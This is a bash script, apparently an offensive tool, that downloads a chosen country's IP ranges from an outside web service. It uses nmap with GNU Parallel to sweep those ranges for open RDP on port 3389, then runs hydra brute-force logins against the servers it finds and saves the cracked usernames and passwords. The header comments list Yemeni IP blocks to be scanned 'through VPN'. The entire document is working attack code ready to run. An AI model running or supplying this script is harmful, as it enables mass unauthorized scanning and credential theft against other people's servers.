#!/bin/bash
# Country IP Range Grabber & RDP Scanner Script
# Requires GNU Parallel tool for the optimized NMAP Scanning
#
# To grab YEMEN IP Range blocks and scan in full for RDP enabled servers (through VPN): 
# 109.200.160-191.0-255
# 109.74.32-47.0-255
# 131.117.160-167.0-255
# 195.94.0-31.0-255
# 31.31.176-191.0-255
# 46.35.64-95.0-255
# 5.100.160-167.0-255
# 82.114.160-191.0-255
# 89.189.64-95.0-255
# 109.200.160-191.0-255
# 109.74.32-47.0-255
# 131.117.160-167.0-255
# 195.94.0-31.0-255
# 31.31.176-191.0-255
# 46.35.64-95.0-255
# 5.100.160-167.0-255
# 82.114.160-191.0-255
# 89.189.64-95.0-255
#
# real	8m15.097s
# user	0m19.085s
# sys	0m9.553s



JUNK=/tmp
STORAGE1=$(mktemp -p "$JUNK" -t foooooscan1.tmp.XXX)
STORAGE2=$(mktemp -p "$JUNK" -t foooooscan2.tmp.XXX)

trap bashtrap INT

function bashtrap(){
	echo
	echo
	echo 'CTRL+C has been detected!.....shutting down now' | grep --color '.....shutting down now'
	#exit entire script if called
	rm -f "$STORAGE1" 2> /dev/null
	rm -f "$STORAGE2" 2> /dev/null
	exit;
}
#End bashtrap()



function usage_info(){
	echo
	echo "Parallel RDP Scanner Script"
	echo
	echo "-G Generate IP Ranges by Country"
	echo "-B Bruteforce attack on each IP in provided list"
	echo "	[*] Uses rdp_users.lst && rdp_pass.lst from current directory"
	echo "-S Scan IP Range for RDP Enabled Servers"
	echo "-T Number of Threads to use for scanning"
	echo "	[*] 1-500"
	echo
	echo "$0 -G"
	echo "$0 -B /path/to/rdp_enabled.lst -T 25"
	echo "$0 -S /path/to/ip_range.lst -T 50"
	exit 1;
}


function generate(){
	echo "Please select which country to grab IP ranges for from the list below: " | grep --color 'Please select which country to grab IP ranges for from the list below'
	curl http://services.ce3c.be/ciprg/ -s | grep "href='?countrys=" | sed -e "s/<td><font size='2'><a href='?countrys=/'/g" -e 's/<\/tr><tr>//g' -e 's/<table><tr>//g' | while read line; do awk -F"'" '{ print $2 }' | sed '/^$/d' >> "$STORAGE1"; done;
	select COUNTRY in $(cat "$STORAGE1")
	do 
		echo "OK, grabbing IP range for $COUNTRY...." | grep --color -E 'OK||grabbing IP range for';
		break 
	done
	curl http://services.ce3c.be/ciprg/?countrys=$COUNTRY -s > "$STORAGE2"; 
	echo
	echo "IP Ranges for: $COUNTRY" | grep --color 'IP Ranges for'
	echo
	if [ ! -d range_lists/ ]; then
		mkdir range_lists/
	fi
	cat "$STORAGE2" | sort | uniq | awk -F":" '{ print $2 }' | while read line
	do
			firstOctStart=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $1 }')
			firstOctEnd=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $5 }')
			secondOctStart=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $2 }')
			secondOctEnd=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $6 }')
			thirdOctStart=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $3 }')
			thirdOctEnd=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $7 }')
			fourthOctStart=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $4 }')
			fourthOctEnd=$(echo "$line" | sed -e 's/\-/./g' | awk -F"." '{ print $8 }')
			if [ "$firstOctStart" == "$firstOctEnd" ]; then
				IP1="$firstOctStart"
			else
				IP1="$firstOctStart-$firstOctEnd"
			fi
			if [ "$secondOctStart" == "$secondOctEnd" ]; then
				IP2="$secondOctStart"
			else
				IP2="$secondOctStart-$secondOctEnd"
			fi
			if [ "$thirdOctStart" == "$thirdOctEnd" ]; then
				IP3="$thirdOctStart"
			else
				IP3="$thirdOctStart-$thirdOctEnd"
			fi
			if [ "$fourthOctStart" == "$fourthOctEnd" ]; then
				IP4="$fourthOctStart"
			else
				IP4="$fourthOctStart-$fourthOctEnd"
			fi
			echo "$IP1.$IP2.$IP3.$IP4" >> range_lists/`echo $COUNTRY`_IP_ranges.lst
	done
	cat range_lists/`echo $COUNTRY`_IP_ranges.lst
	echo
}


function bruter(){
	if [ ! -d rdp_results/ ]; then
		mkdir rdp_results/
	fi
	echo "Starting bruteforcing, this make take a while.........." | grep --color -E 'Starting bruteforcing||this make take a while'
	echo
	cat "$listIP" | parallel -k -j "$threadCount" hydra -L rdp_users.lst -P rdp_pass.lst -u -e ns {} rdp -t 15 -W 3 -f -o "$STORAGE1" 2> /dev/null
	echo
	echo "Results:" | grep --color 'Results'
	cat "$STORAGE1" | while read line
	do
		echo $line | awk -F"3389" '{ print $2 }' | sed -e 's/\]\[rdp\] //g' | grep --color -E 'host||login||password'
		echo $line | awk -F"3389" '{ print $2 }' | sed -e 's/\]\[rdp\] //g' >> rdp_results/`echo $listIP | sed -e 's/.lst//g' -e 's/\//_/g'`_rdp.results
	done
	echo
	echo "The crackin has gone to rest, check the rdp.results file for the full details...." | grep --color -E 'The crackin has gone to rest||check the rdp||results file for the full details'
	echo
}


function quick_scan(){
	echo
	if [ ! -r "$rangeFile" ]; then
		echo "Can't read file provided! Please try again........." | grep --color -E 'Can||t read file provided||Please try again'
		echo
		exit 1;
	fi
	echo "Starting IP range scan for enabled servers, this might take a bit so be patient......" | grep --color -E 'Starting IP range scan for enabled servers||this might take a bit so be patient'
	echo '...'
	cat "$rangeFile" | parallel -k -j $threadCount nmap {} -T5 -PN -p 3389 -oG "$STORAGE1" > /dev/null && grep '/open/' "$STORAGE1" | cut -d' ' -f2,4 | sed -e 's/\/open\/tcp\/\/ms-term-serv\/\/\///g' | awk '{ print $1 }' >> "$STORAGE2"
	if [ ! -d rdp_enabled/ ]; then
		mkdir rdp_enabled/
	fi
	if [ -e rdp_enabled/`echo $rangeFile`_rdp_enabled.lst ]; then
		mv rdp_enabled/`echo $rangeFile | sed 's/\//_/g'`_rdp_enabled.lst rdp_enabled/"`echo $rangeFile | sed -e 's/\//_/g' -e 's/.lst//g'`_rdp_enabled_`date +%Y%m%d%H`.lst.bk"
	fi
	cat "$STORAGE2"  | grep -o "[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}" | sort | uniq > rdp_enabled/`echo $rangeFile | sed -e 's/\//_/g' -e 's/.lst//g'`_rdp_enabled.lst 2> /dev/null
	echo
	echo "All finished scanning, check rdp_enabled/`echo $rangeFile | sed 's/\//_/g'`_rdp_enabled.lst for the results......." | grep --color "All finished scanning, check rdp_enabled/`echo $rangeFile | sed 's/\//_/g'`_rdp_enabled.lst for the results"
	echo
	echo ":)"
}



#MAIN----------------------------------------
clear
if [ -z  "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ]; then
	usage_info
fi
while [ $# -ne 0 ];
do
	case $1 in
		-B) shift; method=bruter; listIP="$1"; shift ;;
		-S) shift; method=quickScan; rangeFile="$1"; shift ;;
		-T) shift; threadCount="$1"; shift;;
		-G) shift; method=generate; shift ;;
		*) echo "Unknown Parameters provided!" | grep --color 'Unknown Parameters provided'; usage_info;;
	esac;
done
if [ "$method" == 'bruter' ]; then
	bruter
elif [ "$method" == 'quickScan' ]; then
	quick_scan
else
	generate
fi


rm -f "$STORAGE1" 2> /dev/null
rm -f "$STORAGE2" 2> /dev/null
#EOF
